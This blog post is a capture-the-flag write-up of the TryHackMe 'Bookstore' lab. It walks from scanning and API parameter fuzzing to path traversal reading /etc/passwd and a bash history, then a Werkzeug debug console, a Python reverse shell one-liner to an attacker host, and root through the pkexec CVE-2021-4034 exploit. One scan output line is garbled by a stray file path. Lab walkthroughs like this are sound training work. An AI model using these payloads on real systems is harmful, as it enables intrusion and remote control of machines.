---
title: "Bookstore"
date: 2025-03-26
image: /assets/img/tryhackme/Bookstore/Bookstore_image.jpg
description: Writeup of the TryHackMe-CTF Bookstore
categories: [TryHackMe, Medium]
tags: [linux, lfi, rce, pkexec]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Bookstore</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>A Beginner level box with basic web enumeration and REST API Fuzzing.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/bookstoreoc">https://tryhackme.com/room/bookstoreoc</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Bookstore.  

## Enumeration
I started the enumeration using `nmap`:
```bash
kali@kali:~/ctf/bookstore$ nmap -p- 10.10.122.52
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 10:47 EDT
  Nmap scan report for 10.10.122.52
  Host is up (0.041s latency).
  Not shown: 65532 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  5000/tcp open  upnp

  Nmap done: 1 IP address (1 host up) scanned in 24.76 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
kali@kali:~/ctf/bookstore$ nmap -A -p 22,80,5000 10.10.122.52
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 10:48 EDT
  Nmap scan report for 10.10.122.52
  Host is up (0.041s latency).

  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
  |   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
  |_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
  80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-title: Book Store
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
  | http-robots.txt: 1 disallowed entry 
  |_/api </p> 
  |_http-title: Home
  |_http-server-header: Werkzeug/0.14.1 Python/3.6.9
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.22 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

The website displayed a bookstore, so I started with a Gobuster directory enumeration:
```bash
kali@kali:~/ctf/bookstore$ gobuster dir --url http://10.10.122.52 --wordlist /usr/share/wordlists/dirb/common.txt -x txt,html,php 
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.122.52
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,html,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 277]
  /.hta                 (Status: 403) [Size: 277]
  /.hta.txt             (Status: 403) [Size: 277]
  /.hta.html            (Status: 403) [Size: 277]
  /.hta.php             (Status: 403) [Size: 277]
  /.htaccess            (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /.htaccess.txt        (Status: 403) [Size: 277]
  /.htaccess.php        (Status: 403) [Size: 277]
  /.htaccess.html       (Status: 403) [Size: 277]
  /.htpasswd.html       (Status: 403) [Size: 277]
  /.htpasswd.php        (Status: 403) [Size: 277]
  /.htpasswd.txt        (Status: 403) [Size: 277]
  /assets               (Status: 301) [Size: 313] [--> http://10.10.122.52/assets/]
  /books.html           (Status: 200) [Size: 2940]
  /favicon.ico          (Status: 200) [S\\172.16.50.250\adminguide\ADMINGUIDE\NEWSTRUCTURE\GIT\MPLhack3d.github.io\assets\img\tryhackme\Bookstore\Bookstore_images.jpgze: 15406]
  /images               (Status: 301) [Size: 313] [--> http://10.10.122.52/images/]
  /index.html           (Status: 200) [Size: 6452]
  /index.html           (Status: 200) [Size: 6452]
  /javascript           (Status: 301) [Size: 317] [--> http://10.10.122.52/javascript/]
  /LICENSE.txt          (Status: 200) [Size: 17130]
  /login.html           (Status: 200) [Size: 5325]
  /server-status        (Status: 403) [Size: 277]
  Progress: 18456 / 18460 (99.98%)
  ===============================================================
  Finished
  ===============================================================
```

I discovered a login page, but the login logic seemed unimplemented. To investigate further, I analyzed the source code and found an interesting comment:
```html
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```

After I analyzed all directories Gobuster had found, I moved on to the next port because it didn't reveal anything useful besides the comment.

## Port 5000 Analysis

The web server displayed a Foxy REST API landing page, so I initiated a Gobuster directory enumeration:

![FoxyREST](/assets/img/tryhackme/Bookstore/thm_bookstore_1.jpg)

```bash
kali@kali:~/ctf/bookstore$ gobuster dir --url http://10.10.122.52:5000/ --wordlist /usr/share/wordlists/dirb/common.txt     
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.122.52:5000/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /api                  (Status: 200) [Size: 825]
  /console              (Status: 200) [Size: 1985]
  /robots.txt           (Status: 200) [Size: 45]
  ```

### Analysis /api Directory

The directory showed the API's documentation:

![API Documentation](/assets/img/tryhackme/Bookstore/thm_bookstore_2.jpg)

I interacted with the API, and it returned some book data as expected. To exploit this, I attempted to inject path traversal and SQL injection payloads, but was unsuccessful. Since the API was labeled as version two, I suspected there might be a version one aswell, and indeed, I was able to retrieve book data of the version one:

![Book data Version one](/assets/img/tryhackme/Bookstore/thm_bookstore_3.jpg)

This was interesting, so I tried several payloads but again was unsuccessful. Since the API documentation showed multiple parameters, I thought the `id` might be useless, so I enumerated to find other valid parameters:
```bash
kali@kali:~/ctf/bookstore$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://10.10.122.52:5000/api/v1/resources/books?FUZZ=../../../../../../../etc/passwd'  
 
          /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
          \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
          \ \_\   \ \_\  \ \____/  \ \_\       
            \/_/    \/_/   \/___/    \/_/       

        v2.1.0-dev
  ________________________________________________

  :: Method           : GET
  :: URL              : http://10.10.122.52:5000/api/v1/resources/books?FUZZ=../../../../../../../etc/passwd
  :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
  :: Follow redirects : false
  :: Calibration      : false
  :: Timeout          : 10
  :: Threads          : 40
  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
  ________________________________________________

  author                  [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 56ms]
  id                      [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 44ms]
  published               [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 52ms]
  show                    [Status: 200, Size: 1555, Words: 9, Lines: 31, Duration: 45ms]
```

The `show` parameter wasn't listed in the API documentation, so I tried to read Sid's Bash history and was successful:

![Sids Bash History](/assets/img/tryhackme/Bookstore/thm_bookstore_4.jpg)

### Directory /console Analysis 

The directory displayed a locked console that required a PIN:

![Console](/assets/img/tryhackme/Bookstore/thm_bookstore_5.jpg)

Since I had obtained the `WERKZEUG_DEBUG_PIN` through the API earlier, I tried the PIN as the console password and successfully authenticated. The console featured a Python terminal, which allowed me to remotely execute Python commands. I tested this with the `print` command: 
```python
  [console ready]
  >>> print("test")
  test
```

Great! Next, I attempted to connect to my machine using a reverse shell payload:
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[attackerip]",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```

I received the reverse shell connection and successfully retrieved the user flag:
```bash
sid@bookstore:~$ id
  uid=1000(sid) gid=1000(sid) groups=1000(sid)
sid@bookstore:~$ cat user.txt 
  4[removed]b
```

## Privilege Escalation root

Next, I checked for SUID bits and discoverd that `pkexec` had its SUID bit set. I used the exploit described in <a href="https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py">CVE-2021-4034</a> and successfully gained root access:
```bash
sid@bookstore:~$ find / -perm /4000 -type f 2>/dev/null
  [...]
  /usr/bin/pkexec
  [...]
sid@bookstore:~$ nano exploit.py
sid@bookstore:~$ python3 exploit.py 
  Do you want to choose a custom payload? y/n (n use default payload)  n
  [+] Cleaning pervious exploiting attempt (if exist)
  [+] Creating shared library for exploit code.
  [+] Finding a libc library to call execve
  [+] Found a library at <CDLL 'libc.so.6', handle 7f4df9395000 at 0x7f4df921d860>
  [+] Call execve() with chosen payload
  [+] Enjoy your root shell
# id
  uid=0(root) gid=1000(sid) groups=1000(sid)
# cat /root/root.txt
  e[removed]3

solved! :)